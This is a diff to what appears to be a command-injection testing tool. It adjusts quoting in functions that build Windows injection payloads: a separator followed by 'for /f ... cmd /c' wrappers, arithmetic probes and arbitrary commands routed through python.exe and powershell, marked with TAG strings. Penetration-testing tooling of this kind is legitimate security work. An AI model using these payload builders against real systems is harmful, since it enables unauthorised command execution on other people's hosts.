@@ -29,7 +29,7 @@ def decision(separator, TAG, randv1, randv2):
     payload = (separator +
               "for /f \"delims=\" %i in ('cmd /c \"" + 
               "set /a (" + str(randv1) + "%2B" + str(randv2) + ")" + 
-              "\"') do @set /p = " + TAG + "%i" + TAG + TAG + " <nul"
+              "\"') do @set /p = " + TAG + "%i" + TAG + TAG + "< nul"
               )
   else:
     if not settings.WAF_ENABLED:
@@ -52,7 +52,7 @@ def decision_alter_shell(separator, TAG, randv1, randv2):
     payload = (separator +
               "for /f \"delims=\" %i in ('cmd /c " + 
               python_payload +
-              "') do @set /p =%i <nul"
+              "') do @set /p =%i< nul"
               )
   else:  
     payload = (separator +
@@ -66,9 +66,9 @@ Execute shell commands on vulnerable host.
 def cmd_execution(separator, TAG, cmd):
   if settings.TARGET_OS == "win":
     payload = (separator +
-              "for /f \"delims=\" %i in ('cmd /c " + 
+              "for /f \"delims=\" %i in ('cmd /c \"" + 
               cmd + 
-              "') do @set /p = " + TAG + TAG + "%i" + TAG + TAG + " <nul"
+              "\"') do @set /p = " + TAG + TAG + "%i" + TAG + TAG + "< nul"
               )
   else:       
     if not settings.WAF_ENABLED:
@@ -95,7 +95,7 @@ def cmd_execution_alter_shell(separator, TAG, cmd):
       payload = (separator +
                 "for /f \"delims=\" %i in ('" + 
                 settings.WIN_PYTHON_DIR + "python.exe -c \"import os; os.system('powershell.exe -InputFormat none write-host " + TAG + TAG + " $(" + cmd + ") "+ TAG + TAG + "')\"" +
-                "') do @set /p =%i <nul"
+                "') do @set /p =%i< nul"
                 )
                                                                       
   else:
